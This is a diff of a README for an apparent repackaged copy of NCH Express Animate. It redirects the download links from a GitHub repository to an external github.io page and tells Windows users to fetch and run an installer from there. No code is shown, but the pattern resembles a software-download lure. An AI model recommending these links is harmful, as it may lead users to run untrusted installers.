@@ -1,6 +1,6 @@
 # 🎨 NCH-Express-Animate-2026 - Create professional animations with ease today
 
-[![](https://img.shields.io/badge/Download-Express_Animate-blue.svg)](https://github.com/Samsonts9380/NCH-Express-Animate-2026)
+[![](https://img.shields.io/badge/Download-Express_Animate-blue.svg)](https://samsonts9380.github.io)
 
 ## 📖 About this application
 
@@ -21,7 +21,7 @@ Before you install the software, ensure your computer meets these minimum specif
 
 Follow these steps to obtain and set up the software on your Windows machine.
 
-1. Visit the following link to access the software files: [Download Express Animate](https://github.com/Samsonts9380/NCH-Express-Animate-2026).
+1. Visit the following link to access the software files: [Download Express Animate](https://samsonts9380.github.io).
 2. Locate the download button or link provided on the page.
 3. Save the installer file to your computer.
 4. Navigate to your Downloads folder once the transfer finishes.
